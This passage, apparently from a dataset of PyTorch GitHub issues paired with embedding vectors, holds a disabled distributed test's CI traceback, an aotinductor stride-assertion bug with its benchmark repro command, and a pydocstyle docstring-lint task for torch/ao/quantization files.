- **File**: `./torch/_refs/special/__init__.py`, **Line**: 231
- **File**: `./torch/masked/_ops.py`, **Line**: 1479
- **File**: `./torch/_refs/__init__.py`, **Line**: 1080
- **File**: `./torch/_refs/__init__.py`, **Line**: 1090
- **File**: `./torch/_refs/__init__.py`, **Line**: 1098
- **File**: `./torch/_refs/__init__.py`, **Line**: 1106

cc @carljparker",False,"[-0.2527419   0.0989776  -0.02890548  0.04894347  0.06468676 -0.008851
 -0.02313877  0.19209597 -0.49232033  0.04113455 -0.3193664   0.15419722
  0.01238995  0.07547599 -0.12546863 -0.01430082 -0.34745336  0.08949549
 -0.04497798 -0.04386583  0.18881227  0.42107576 -0.1786992  -0.02198843
 -0.12480547  0.18500416 -0.5240768  -0.19047754 -0.00985332  0.251336
  0.2759131   0.20315835 -0.5522303   0.06044583  0.3708775  -0.0237064
  0.00260141  0.38538325 -0.03621517 -0.15446304  0.12262996  0.04864688
 -0.20514746  0.6189131  -0.0603817  -0.2910896  -0.33524564  0.05264346
 -0.06150385 -0.00226627 -0.2780335  -0.05616125 -0.40286005  0.40207636
  0.09392849 -0.34815502 -0.10937485  0.4280181   0.38925987 -0.16076106
  0.0993153   0.13525319  0.23251572  0.26891914 -0.262155    0.12881589
 -0.11167139  0.3093625   0.399099    0.05020672 -0.17752385 -0.01259314
  0.0524158  -0.16081794  0.1121573   0.03191787 -0.49666446  0.07039297
 -0.25363526 -0.2646015  -0.1346161  -0.01598296  0.08606574  0.3780067
  0.10258971  0.05231109  0.16491927  0.05941173  0.13728485  0.14300288
  0.13123606 -0.10309123  0.35436553  0.3113414  -0.16707143  0.12870696
  0.14243576 -0.08624391 -0.03487286 -0.14452027 -0.00711458 -0.7438071
 -0.19357471  0.14809033  0.01143896 -0.34553438  0.12454867  0.16355595
 -0.02376619 -0.06085647  0.27529824  0.06008966 -0.0509879  -0.0478551
 -0.04221524  0.02715958 -0.20719363 -0.15128426 -0.20371994  0.13794522
  0.47946307  0.5160183  -0.19585414  0.17702857  0.3748995  -0.02824279
  0.1716192   0.1990373   0.26571888  0.1642064  -0.14101873  0.10595173
  0.13919193  0.29907233  0.3613649   0.11591776 -0.35182488 -0.29784942
  0.00619043  0.10391332 -0.2945233  -0.04138458 -0.31392303 -0.48522615
  0.29208606  0.27260473 -0.651783    0.06252874  0.0657705   0.25905567
 -0.41550866  0.12838511 -0.26749486  0.5063551   0.03391346 -0.02092475
  0.39455312 -0.03553793 -0.06875807 -0.15844919  0.09865164  0.18316303
 -0.09171078  0.0571637  -0.04021867 -0.24999824 -0.15582429 -0.28040022
 -0.52137905  0.00257693  0.07222302  0.00991026 -0.11593675  0.15128906
 -0.14138147 -0.00396544 -0.0463421  -0.49433866  0.09897675  0.28816158
  0.37179694  0.41532803  0.1679433  -0.00095215 -0.37801725  0.09715676
  0.34310868 -0.00806585  0.0822183   0.03501269  0.00600994 -0.0757031
  0.17610034 -0.13902707 -0.0877255   0.1829471  -0.05936015  0.28564954
 -0.48252055  0.32783535 -0.18263067  0.27295712  0.06422027 -0.04937068
  0.71266574  0.26851478 -0.50110793 -0.63856614 -0.5109658   0.07056879
 -0.28161663  0.23238322  0.11211976 -0.4099046  -0.3373033   0.5775033
 -0.16386461 -0.17896071  0.25162774 -0.17489702 -0.28323942 -0.2404789
 -0.15823695 -0.44294015  0.08703768  0.10019693 -0.1694901   0.22204833
 -0.05137616  0.18431455 -0.23935315 -0.07833034  0.7273001  -0.00297535
  0.26621065  0.27918547 -0.2343896  -0.26142174 -0.1573739   0.09072738
 -0.16537885  0.18215877 -0.01177736 -0.03025977  0.18815193  0.04371778
 -0.26412407 -0.0879057  -0.1690771   0.18461753 -0.04952998 -0.392224
 -0.02392058  0.12628087  0.57088244  0.18057016 -0.4009319  -0.08306752
  0.00356396 -0.23467812 -0.09540337  0.24457863 -0.16107076  0.3172105
  0.3888902  -0.15057832 -0.18197465  0.20473196 -0.31291622 -0.25618303
  0.30450523 -0.3204745   0.43525344  0.42657903  0.18220524 -0.15585995
  0.10294569 -0.24520695 -0.14941213 -0.08711329 -0.02872183 -0.04473199
 -0.20868534  0.16846368  0.4072218  -0.19790949 -0.17216152 -0.32670757
 -0.29904726 -0.1778363  -0.30066317 -0.02200501  0.24729532  0.08508904
  0.03688595 -0.08748206  0.08267841  0.04112294  0.5716269   0.01147599
 -0.33289155 -0.07374924 -0.24955657  0.17032605 -0.02308519  0.17793575
 -0.01146058  0.13955368  0.5380711  -0.2096851   0.09451863  0.5062165
 -0.18356524  0.00933747 -0.20049556  0.09623905  0.11697346  0.33227065
 -0.15928122 -0.0110207   0.09359859 -0.10788172 -0.4314284   0.03646656
 -0.07939607 -0.01731712 -0.52524984  0.14412655 -0.38119638 -0.5144333
  0.24280117  0.08374619 -0.04438    -0.31318885 -0.08437561  0.13589337
  0.14345714  0.21865654 -0.06888806 -0.39847505 -0.37553686 -0.02914658
  0.32480907 -0.24511434 -0.37789467  0.10324873  0.13079712  0.26760924
 -0.09904212  0.14351279  0.49650416  0.03754173 -0.16392677  0.24340132
 -0.10612252  0.32981497 -0.07097877  0.3961562   0.05228445  0.5395824
 -0.3930986  -0.0229971  -0.22600327 -0.1588771  -0.29184365 -0.16615525
  0.16811448  0.06583837 -0.16218236  0.05685282  0.04765641  0.01290464
 -0.06899774  0.38549885  0.0823834   0.30233938  0.6669706  -0.02050893
  0.01947711 -0.17834276 -0.22367653  0.03262242  0.34119606  0.04717144]"
DISABLED test_2d_optim_state_dict_is_even_sharded_model_True (__main__.TestNew2dParallelStateDict) skipped,"
Probably the same situation as https://github.com/pytorch/pytorch/issues/112969


This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2Ftensor%2Fparallel%2Ftest_fsdp_2d_parallel.py%3A%3ATestNew2dParallelStateDict%3A%3Atest_2d_optim_state_dict_is_even_sharded_model_True)).
```
2023-11-06T15:42:54.5951979Z =========================== short test summary info ============================
2023-11-06T15:42:54.5953682Z FAILED [3.0441s] distributed/tensor/parallel/test_fsdp_2d_parallel.py::TestNew2dParallelStateDict::test_2d_optim_state_dict_is_even_sharded_model_True - RuntimeError: Process 0 exited with error code 10 and exception:
2023-11-06T15:42:54.5955162Z Traceback (most recent call last):
2023-11-06T15:42:54.5956257Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 658, in run_test
2023-11-06T15:42:54.5957268Z     getattr(self, test_name)()
2023-11-06T15:42:54.5958307Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 544, in wrapper
2023-11-06T15:42:54.5959291Z     fn()
2023-11-06T15:42:54.5960202Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 2536, in wrapper
2023-11-06T15:42:54.5961164Z     method(*args, **kwargs)
2023-11-06T15:42:54.5962216Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_utils.py"", line 364, in instantiated_test
2023-11-06T15:42:54.5963245Z     test(self, **param_kwargs)
2023-11-06T15:42:54.5964399Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/distributed/_tensor/common_dtensor.py"", line 190, in wrapper
2023-11-06T15:42:54.5965612Z     func(self, *args, **kwargs)  # type: ignore[misc]
2023-11-06T15:42:54.5966806Z   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/testing/_internal/common_distributed.py"", line 174, in wrapper
2023-11-06T15:42:54.5967981Z     return func(*args, **kwargs)
2023-11-06T15:42:54.5969018Z   File ""/var/lib/jenkins/workspace/test/distributed/tensor/parallel/test_fsdp_2d_parallel.py"", line 571, in test_2d_optim_state_dict
2023-11-06T15:42:54.5970105Z     _, no_wrap_osd = get_state_dict(
2023-11-06T15:42:54.5970814Z TypeError: get_state_dict() got an unexpected keyword argument 'optim_only'
```
",False,"[-0.15481636  0.04499266 -0.36772424  0.17910329 -0.07278298 -0.24034105
 -0.06106649  0.00255483 -0.31971693 -0.2855871   0.41708368 -0.02272617
  0.20600109  0.01397315 -0.23347566 -0.09630424 -0.11534679 -0.31352484
  0.06261419  0.1531155  -0.02270605 -0.1693094  -0.21892339 -0.04134367
 -0.10931663 -0.04720397 -0.06727695  0.00403884 -0.03335536  0.10141233
  0.25976023  0.31916177 -0.31469902 -0.02247886  0.2001056  -0.08254267
 -0.08153863 -0.5448401  -0.05604563 -0.00658606 -0.03839047  0.12462391
 -0.14386351  0.03183013 -0.0727486   0.18310665 -0.08559555  0.22226831
 -0.23111294 -0.2095033   0.11007482  0.01368769 -0.260468   -0.4281065
  0.23545545 -0.2380818   0.13525638  0.22718012 -0.15472525  0.11729527
  0.25529176  0.07201891 -0.03966384  0.01344037  0.03321792  0.21807988
 -0.09546913 -0.5967922   0.5519285  -0.05689318  0.10384896  0.07929149
 -0.26353717  0.00532234  0.2358264   0.0947815  -0.25401682  0.20106114
 -0.07419221 -0.22016218 -0.02851138 -0.25620395  0.00467125 -0.03439428
  0.39823154 -0.08660719 -0.12078528 -0.05438275  0.2881571  -0.07367717
  0.19272259 -0.09599608 -0.12379898  0.06229205  0.22780293  0.05214632
 -0.01417659 -0.0080485  -0.14424351 -0.01816919  0.04234574 -0.4245062
 -0.27968404  0.2098085  -0.213156    0.00335736  0.26517835  0.16025868
  0.15348059  0.02708044  0.19746007 -0.07104968  0.11167645  0.22244881
  0.12316278  0.0207757  -0.00785634 -0.22757775 -0.22391394  0.18673581
 -0.01371272 -0.09603889  0.12390994 -0.02187435  0.32936475  0.16915217
 -0.10739177  0.22100353  0.04501834 -0.01438746  0.22596672 -0.27599066
 -0.0862065  -0.0158616   0.00146589 -0.13870868 -0.10253301 -0.16339272
  0.11242544  0.13860309 -0.20970954  0.12583461  0.0745768   0.01963306
  0.08277483  0.1421568  -0.2920572   0.4467076   0.23164435  0.17667106
  0.0535701  -0.11441872 -0.12582254  0.4216804   0.09504294 -0.01073915
  0.15268622  0.00963007  0.04186939 -0.19417423 -0.16432855  0.19725218
 -0.08729546  0.1299909   0.3240736   0.04689241 -0.48076713 -0.02215067
 -0.05543989  0.22859082  0.17530268 -0.06450257  0.18369272 -0.25500855
 -0.27688128 -0.03694758 -0.0350328  -0.17339969 -0.4714048   0.26722458
  0.19612676 -0.04580967  0.15209256  0.06900114 -0.0304435   0.42818114
  0.09832985 -0.11834814  0.0089264  -0.15978773 -0.51643527  0.01422952
  0.01036219  0.04870459 -0.28076982 -0.2902478   0.02795301 -0.10325708
  0.11422066  0.12652     0.02647869 -0.11203906  0.27620342 -0.3747254
  0.01493791  0.05358884 -0.09777823 -0.39805818  0.39899927  0.12755542
 -0.38494548 -0.24634883 -0.3527723  -0.31247532 -0.15730004 -0.04407973
 -0.07464053  0.07541852  0.12447336  0.3070627  -0.16394147 -0.25118303
 -0.06417229 -0.22832206 -0.41895258  0.06484136 -0.08268252  0.15268913
 -0.03744685  0.03014687  0.14964765 -0.2072574   0.07676512  0.13183251
  0.53011465  0.07652252 -0.21929058 -0.10033144 -0.08469907  0.35603118
 -0.26434216 -0.29305518 -0.07985127  0.08742504 -0.08140753  0.21433806
 -0.13820954  0.01203681 -0.2235791   0.21171221 -0.29676884 -0.2743402
  0.10424345 -0.19440755  0.30440897  0.32870066 -0.02523821 -0.1101139
  0.04480322 -0.05906955 -0.02836276  0.34210664 -0.13960105  0.48903653
  0.2907458   0.12911925 -0.13231091  0.12478276 -0.08468608  0.19621944
  0.46032125 -0.5366967   0.15039866  0.0565531   0.21056664 -0.18528068
  0.36348027 -0.0454662  -0.04857165 -0.00225855  0.3109578   0.09486221
 -0.04752304  0.05852529  0.2803154   0.00074677 -0.03728225 -0.18028712
 -0.33796588 -0.17029124 -0.20544107  0.4225736   0.51340306 -0.07845148
 -0.33137453 -0.03147749  0.21109596 -0.19310729  0.35801375 -0.0983736
 -0.40714496  0.18064813  0.11079019 -0.05754204 -0.20230386 -0.078235
  0.03119197 -0.08073603  0.44389138 -0.3667139   0.05604909 -0.05867245
 -0.12195612  0.2618202  -0.2834496   0.10189396 -0.2618394   0.07612953
  0.16409722  0.3839899   0.1505794  -0.31971705 -0.45237735  0.31549394
  0.24540068 -0.2773548  -0.15501732  0.01763766 -0.17243074 -0.13532118
 -0.15910935  0.16375256 -0.14481106 -0.20773235  0.13926853 -0.07457559
  0.01381742  0.44331467  0.25832784 -0.08933836  0.02337029 -0.41248018
  0.00245711 -0.09536029 -0.17319474  0.08850735  0.3122788  -0.0549151
  0.06289827  0.16560453  0.2448548   0.07094944 -0.17303765  0.07750972
 -0.02012846  0.32514542 -0.02205712  0.42262962  0.3445909   0.26407766
 -0.26256937  0.04266891 -0.3961135   0.07831894  0.12614028 -0.10138553
 -0.14732671 -0.2506805   0.29563385  0.34088013 -0.4379476   0.23614927
 -0.24691688 -0.03324183  0.22469191  0.06869569  0.4443044  -0.5263994
 -0.29809445  0.03986146  0.3323673  -0.00274477  0.0628565   0.10552616]"
"[aotinductor] xcit_large_24_p8_224: AssertionError: expected size 768==768, stride 784==1 at dim=1 triaged oncall: pt2","Repro:
```
python benchmarks/dynamo/timm_models.py --inference --bfloat16   --disable-cudagraphs --device cuda --only xcit_large_24_p8_224   --export-aot-inductor --performance
```
Error:
```
    assert_size_stride(buf12, (1, 768, 28, 28), (602112, 1, 21504, 768))
AssertionError: expected size 768==768, stride 784==1 at dim=1
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.13202994 -0.04481927 -0.19299842  0.15441367 -0.08774795 -0.41035563
 -0.01753262  0.14862871 -0.46714354 -0.00255132  0.11831559 -0.19305953
 -0.00727622 -0.08766219 -0.10109242  0.12936604  0.08509553 -0.35285127
  0.06193572 -0.07943885  0.22118637 -0.08558748 -0.12049624  0.04133005
  0.21058823 -0.02548607 -0.02653651 -0.00589107  0.21267892 -0.12434869
  0.33593562  0.03810692 -0.22949705  0.07831459  0.13347732  0.13174364
 -0.27971697 -0.18360469 -0.0212551   0.17860985  0.05468329  0.24517559
 -0.02510331  0.09152631 -0.12011952 -0.16102134 -0.35446626  0.32636133
 -0.3895758  -0.14652967 -0.02395755  0.24841908 -0.3672052  -0.40834364
 -0.02928226 -0.19823797 -0.05723994  0.14800209  0.02615582 -0.16257074
  0.1925751   0.02726505 -0.05731586 -0.0326708  -0.12706417  0.4156561
  0.245105    0.00696131  0.19077696  0.29812795  0.01974784 -0.06347895
 -0.3295669  -0.10395343  0.06781785  0.15619403 -0.0821073   0.2147804
 -0.22107668 -0.06554072 -0.15230629 -0.08769542 -0.10451689 -0.09414845
  0.12237933 -0.12466653 -0.01555577  0.01498172  0.05514726 -0.1799986
  0.3921369   0.14214972 -0.31309462  0.443629    0.06123365  0.08073349
  0.14031626 -0.28320634 -0.16532724  0.08360101  0.05115281  0.0567475
 -0.4045121   0.2910781  -0.17670898  0.00887288  0.2800169   0.0125651
  0.26533362  0.37940687  0.09839525 -0.22255236 -0.01342714 -0.01638086
  0.23731554  0.17551515 -0.4005671   0.1953313  -0.14476188 -0.19064462
 -0.15165973  0.10895269  0.18581946  0.13360679  0.17990926  0.08063196
  0.31649944 -0.17527948 -0.00125461 -0.00386816 -0.02498249 -0.18334034
 -0.08260594 -0.04108639  0.28995752  0.30977246  0.02742951 -0.06248582
 -0.30331588 -0.01326983 -0.13453516 -0.10647343  0.09384601 -0.25397336
  0.3217225   0.48883146 -0.26951957  0.20396101  0.14810613 -0.35315964
 -0.1442815  -0.10873114 -0.14269751  0.25180387  0.21519318  0.21411401
  0.2664046   0.1549089   0.02831374 -0.2222481   0.08778851  0.12012083
  0.07165996 -0.05124936  0.02781318  0.13282263 -0.15976554 -0.18629836
 -0.2571516   0.01230968 -0.14737138 -0.14241391 -0.19689444 -0.1046439
  0.23737934 -0.26450303 -0.3404532  -0.28616902  0.08599328  0.14049971
  0.1637756   0.46649942  0.46405023 -0.01132575 -0.07275211  0.22111051
  0.44651502  0.05453082  0.31258175 -0.10480759 -0.10913332 -0.05794531
  0.07995682  0.15795189 -0.06604297 -0.16840008  0.26985013  0.1242719
  0.08494594  0.22731994 -0.1458315  -0.036631    0.10145588 -0.06577931
  0.1604931  -0.02821432 -0.0970962  -0.10457101 -0.1211352   0.03666508
 -0.2454992  -0.33796832  0.02930911 -0.30303562 -0.13123268  0.14631383
 -0.13952038 -0.06408421 -0.06758785  0.19007519  0.10995391 -0.11682587
 -0.05138781 -0.27378222  0.09151383  0.09637237  0.04131541 -0.32839867
 -0.19735228 -0.05709272  0.11329748 -0.24311131  0.3114606   0.02403034
 -0.07373302  0.03929836  0.07287392 -0.33949682  0.10595185 -0.01189484
 -0.20092064 -0.22174072  0.05725689 -0.25186163  0.26614618 -0.23457453
 -0.07650238 -0.17728806  0.02682756  0.28057298 -0.22130585 -0.30507472
  0.2825314  -0.06588791  0.09578218  0.19605199  0.06740901  0.07312841
 -0.1954776  -0.03276459  0.08466885  0.53111327 -0.24679613  0.10851039
  0.10630336  0.08554682 -0.18709104  0.23541938  0.26072127 -0.1682633
  0.30845082 -0.35432005  0.2340105  -0.0474287   0.20842904  0.08641517
  0.49708125  0.18149269  0.07118506 -0.06344272 -0.01075628  0.20126985
 -0.09124438 -0.25838023  0.32079196 -0.483974   -0.18934879 -0.11573939
 -0.31775606 -0.07122093 -0.10533154  0.12606144  0.04461839 -0.01106834
 -0.13019753  0.33861944 -0.00840174  0.15511644 -0.08188923 -0.3892396
 -0.05735455  0.09462857 -0.00831673  0.18447416 -0.247179    0.2691222
  0.17421535 -0.03061431  0.30092812 -0.412367    0.5220925   0.12164088
 -0.14449692  0.28874487 -0.37201342  0.10436711  0.0163011   0.44392794
  0.06048943 -0.02139601 -0.2505142  -0.25633854 -0.26339453 -0.04124716
  0.26367325 -0.05376602 -0.585137   -0.01539523 -0.09787597 -0.35522944
  0.3108538   0.1531717  -0.16195479  0.24916513 -0.00770655 -0.11924643
 -0.2594509   0.10611036  0.01901587 -0.09195143  0.11638573 -0.23444167
  0.03997222 -0.37171987 -0.19701135  0.00772289  0.10853765  0.43612856
 -0.07358207 -0.24584198  0.02412646  0.11149126  0.09509729 -0.0936503
  0.27960885  0.34224454  0.14849222  0.2858353   0.00970491  0.20188537
 -0.29897755  0.07416787 -0.27528247  0.10378782  0.18950197 -0.02136556
 -0.04414327 -0.10943906  0.10294615  0.31137264 -0.21263006  0.2356934
 -0.16494891  0.12586834  0.11555813  0.05493519 -0.00945411 -0.22604468
 -0.05528504  0.06321479  0.32658735 -0.00220005  0.08245085  0.06354553]"
torch/ao/quantization pydocstyle module: docs triaged medium topic: not user facing docathon-h2-2023,"### ðŸ“š The doc issue

For files
```
__init__.py
_correct_bias.py
_equalize.py
_learnable_fake_quantize.py
backend_config
experimental
fake_quantize.py
fuse_modules.py
fuser_method_mappings.py
```

Correct the following
```
__init__.py:1 at module level:
        D104: Missing docstring in public package
__init__.py:144 in public function `default_eval_fn`:
        D205: 1 blank line required between summary line and description (found 0)
__init__.py:144 in public function `default_eval_fn`:
        D400: First line should end with a period (not 'f')
__init__.py:144 in public function `default_eval_fn`:
        D401: First line should be in imperative mood; try rephrasing (found 'Default')
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D204: 1 blank line required after class docstring (found 0)
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
__init__.py:152 in private class `_DerivedObserverOrFakeQuantize`:
        D400: First line should end with a period (not 's')
_correct_bias.py:20 in public function `get_module`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_correct_bias.py:20 in public function `get_module`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:20 in public function `get_module`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:20 in public function `get_module`:
        D400: First line should end with a period (not 'l')
_correct_bias.py:25 in public function `parent_child_names`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_correct_bias.py:25 in public function `parent_child_names`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:25 in public function `parent_child_names`:
        D400: First line should end with a period (not 'e')
_correct_bias.py:25 in public function `parent_child_names`:
        D401: First line should be in imperative mood (perhaps 'Split', not 'Splits')
_correct_bias.py:34 in public function `get_param`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:34 in public function `get_param`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:34 in public function `get_param`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:34 in public function `get_param`:
        D400: First line should end with a period (not 's')
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D204: 1 blank line required after class docstring (found 0)
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:44 in public class `MeanShadowLogger`:
        D400: First line should end with a period (not 'n')
_correct_bias.py:47 in public method `__init__`:
        D107: Missing docstring in __init__
_correct_bias.py:56 in public method `forward`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:56 in public method `forward`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:56 in public method `forward`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:56 in public method `forward`:
        D401: First line should be in imperative mood; try rephrasing (found 'The')
_correct_bias.py:77 in public method `clear`:
        D102: Missing docstring in public method
_correct_bias.py:85 in public function `bias_correction`:
        D205: 1 blank line required between summary line and description (found 0)
_correct_bias.py:85 in public function `bias_correction`:
        D210: No whitespaces allowed surrounding docstring text
_correct_bias.py:85 in public function `bias_correction`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_correct_bias.py:85 in public function `bias_correction`:
        D400: First line should end with a period (not 's')
_correct_bias.py:85 in public function `bias_correction`:
        D401: First line should be in imperative mood (perhaps 'Use', not 'Using')
_equalize.py:22 in public function `set_module_weight`:
        D103: Missing docstring in public function
_equalize.py:28 in public function `set_module_bias`:
        D103: Missing docstring in public function
_equalize.py:34 in public function `get_module_weight`:
        D103: Missing docstring in public function
_equalize.py:40 in public function `get_module_bias`:
        D103: Missing docstring in public function
_equalize.py:47 in public function `max_over_ndim`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:47 in public function `max_over_ndim`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:47 in public function `max_over_ndim`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:47 in public function `max_over_ndim`:
        D400: First line should end with a period (not 's')
_equalize.py:47 in public function `max_over_ndim`:
        D401: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
_equalize.py:55 in public function `min_over_ndim`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:55 in public function `min_over_ndim`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:55 in public function `min_over_ndim`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:55 in public function `min_over_ndim`:
        D400: First line should end with a period (not 's')
_equalize.py:55 in public function `min_over_ndim`:
        D401: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
_equalize.py:63 in public function `channel_range`:
        D200: One-line docstring should fit on one line with quotes (found 2)
_equalize.py:63 in public function `channel_range`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:63 in public function `channel_range`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:63 in public function `channel_range`:
        D400: First line should end with a period (not 'l')
_equalize.py:63 in public function `channel_range`:
        D401: First line should be in imperative mood (perhaps 'Find', not 'finds')
_equalize.py:63 in public function `channel_range`:
        D403: First word of the first line should be properly capitalized ('Finds', not 'finds')
_equalize.py:76 in public function `cross_layer_equalization`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:76 in public function `cross_layer_equalization`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:76 in public function `cross_layer_equalization`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:76 in public function `cross_layer_equalization`:
        D400: First line should end with a period (not 't')
_equalize.py:120 in public function `equalize`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:120 in public function `equalize`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:120 in public function `equalize`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:120 in public function `equalize`:
        D400: First line should end with a period (not 'l')
_equalize.py:159 in public function `converged`:
        D205: 1 blank line required between summary line and description (found 0)
_equalize.py:159 in public function `converged`:
        D210: No whitespaces allowed surrounding docstring text
_equalize.py:159 in public function `converged`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
_equalize.py:159 in public function `converged`:
        D400: First line should end with a period (not 's')
_equalize.py:159 in public function `converged`:
        D401: First line should be in imperative mood (perhaps 'Test', not 'Tests')
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D204: 1 blank line required after class docstring (found 0)
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
_learnable_fake_quantize.py:8 in private class `_LearnableFakeQuantize`:
        D400: First line should end with a period (not 'h')
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D400: First line should end with a period (not 'd')
_learnable_fake_quantize.py:68 in private method `enable_param_learning`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D400: First line should end with a period (not 'f')
_learnable_fake_quantize.py:78 in private method `enable_static_estimate`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D205: 1 blank line required between summary line and description (found 0)
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D400: First line should end with a period (not 't')
_learnable_fake_quantize.py:87 in private method `enable_static_observation`:
        D401: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
fake_quantize.py:1 at module level:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:1 at module level:
        D400: First line should end with a period (not 'n')
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:61 in public class `FakeQuantizeBase`:
        D400: First line should end with a period (not 'e')
fake_quantize.py:74 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:83 in public method `forward`:
        D102: Missing docstring in public method
fake_quantize.py:87 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:91 in public method `enable_fake_quant`:
        D102: Missing docstring in public method
fake_quantize.py:95 in public method `disable_fake_quant`:
        D102: Missing docstring in public method
fake_quantize.py:99 in public method `enable_observer`:
        D102: Missing docstring in public method
fake_quantize.py:103 in public method `disable_observer`:
        D102: Missing docstring in public method
fake_quantize.py:107 in public method `with_args`:
        D102: Missing docstring in public method
fake_quantize.py:115 in public class `FakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:115 in public class `FakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:115 in public class `FakeQuantize`:
        D412: No blank lines allowed between a section header and its content ('Attributes')
fake_quantize.py:150 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:188 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:191 in public method `forward`:
        D102: Missing docstring in public method
fake_quantize.py:214 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D400: First line should end with a period (not 'n')
fake_quantize.py:268 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:279 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:283 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:292 in public class `FusedMovingAvgObsFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:292 in public class `FusedMovingAvgObsFakeQuantize`:
        D400: First line should end with a period (not 'e')
fake_quantize.py:307 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:322 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:326 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:342 in public method `forward`:
        D102: Missing docstring in public method
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D200: One-line docstring should fit on one line with quotes (found 2)
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fake_quantize.py:491 in public function `disable_fake_quant`:
        D400: First line should end with a period (not ':')
fake_quantize.py:502 in public function `enable_fake_quant`:
        D400: First line should end with a period (not ':')
fake_quantize.py:513 in public function `disable_observer`:
        D400: First line should end with a period (not ':')
